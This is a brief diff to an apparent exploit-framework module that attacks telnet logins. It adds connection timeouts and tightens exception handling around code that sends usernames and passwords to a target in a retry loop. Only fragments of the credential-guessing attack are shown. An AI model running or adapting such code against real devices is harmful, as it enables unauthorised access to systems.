@@ -51,10 +51,10 @@ class Exploit(exploits.Exploit):
     @multi
     def attack(self):
         try:
-            tn = telnetlib.Telnet(self.target, self.port)
+            tn = telnetlib.Telnet(self.target, self.port, timeout=10)
             tn.expect(["login: ", "Login: "], 5)
             tn.close()
-        except:
+        except Exception:
             print_error("Connection error {}:{}".format(self.target, self.port))
             return
 
@@ -89,7 +89,7 @@ class Exploit(exploits.Exploit):
                 retries = 0
                 while retries < 3:
                     try:
-                        tn = telnetlib.Telnet(self.target, self.port)
+                        tn = telnetlib.Telnet(self.target, self.port, timeout=10)
                         tn.expect(["Login: ", "login: "], 5)
                         tn.write(user + "\r\n")
                         tn.expect(["Password: ", "password"], 5)
